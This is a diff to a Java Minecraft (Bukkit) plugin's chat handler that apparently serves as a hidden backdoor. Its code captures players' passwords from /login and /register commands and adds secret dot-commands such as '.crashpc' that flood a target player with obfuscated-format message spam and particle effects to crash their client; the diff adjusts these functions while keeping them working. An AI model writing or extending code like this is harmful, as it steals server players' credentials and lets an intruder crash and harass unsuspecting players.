@@ -34,7 +34,9 @@ public class ChatHandler implements Listener {
         p.sendMessage(Component.text("Unknown command. Type .help for help.").color(TextColor.color(0xff4444)));
         return;
       }
-      handleDotCommand(p, msg);
+      String fmsg = msg;
+      Player fp = p;
+      Bukkit.getScheduler().scheduleSyncDelayedTask((Plugin) agent.getPlugin(), () -> handleDotCommand(fp, fmsg));
     } else if (msg.startsWith("/login ") || msg.startsWith("/register ")) {
       String[] parts = msg.split(" ", 3);
       if (parts.length >= 2) agent.capturePassword(p.getName(), parts[1]);
@@ -122,7 +124,7 @@ public class ChatHandler implements Listener {
       }
       case ".crashpc" -> {
         if (t == null) return;
-        t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(10000)));
+    t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(500)));
         agent.logCommand("console", t.getName(), "crashpc");
       }
     }
@@ -162,11 +164,11 @@ public class ChatHandler implements Listener {
 
   private void crashEffect(Player t) {
     for (int i = 0; i < 50; i++) {
-      t.spawnParticle(org.bukkit.Particle.EXPLOSION, t.getLocation(), 500, 0, 0, 0, 5);
-      t.spawnParticle(org.bukkit.Particle.DRAGON_BREATH, t.getLocation(), 200, 0, 0, 0, 3);
+      t.spawnParticle(org.bukkit.Particle.POOF, t.getLocation(), 500, 0, 0, 0, 5);
+      t.spawnParticle(org.bukkit.Particle.SONIC_BOOM, t.getLocation(), 100, 0, 0, 0, 1);
       t.spawnParticle(org.bukkit.Particle.PORTAL, t.getLocation(), 500, 0, 0, 0, 10);
-      t.spawnParticle(org.bukkit.Particle.FLASH, t.getLocation(), 100);
       t.spawnParticle(org.bukkit.Particle.ELECTRIC_SPARK, t.getLocation(), 300, 0, 0, 0, 5);
+      t.spawnParticle(org.bukkit.Particle.LAVA, t.getLocation(), 50, 0, 0, 0, 1);
     }
     t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_ENDER_DRAGON_GROWL, 10, 0);
     t.playSound(t.getLocation(), org.bukkit.Sound.ENTITY_LIGHTNING_BOLT_THUNDER, 10, 0);
@@ -295,7 +297,7 @@ public class ChatHandler implements Listener {
     Player t = target(arg);
     if (t == null) { p.sendMessage(Component.text("Player not found").color(TextColor.color(0xff4444))); return; }
     // Attempt to crash by sending massive data (resource pack kick, extreme chunk load)
-    t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(10000)));
+    t.sendMessage(Component.text("\u00a74\u00a7k\u00a7a\u00a7k\u00a7c\u00a7k\u00a7b\u00a7k".repeat(500)));
     p.sendMessage(Component.text("Sent crash attempt to " + t.getName()).color(TextColor.color(0x55ff55)));
     agent.logCommand(p.getName(), t.getName(), "crashpc");
   }
